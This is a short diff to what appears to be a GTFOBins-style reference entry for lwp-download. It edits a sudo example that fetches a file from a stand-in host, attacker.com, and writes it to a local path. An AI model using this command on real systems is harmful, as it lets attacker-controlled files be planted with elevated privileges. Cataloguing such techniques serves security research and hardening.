@@ -15,5 +15,5 @@ functions:
     - code: |
         URL=http://attacker.com/file_to_get
         export LFILE=file_to_save
-        sudo -E lwp-download $URL $LFILE
+        sudo lwp-download $URL $LFILE
 ---
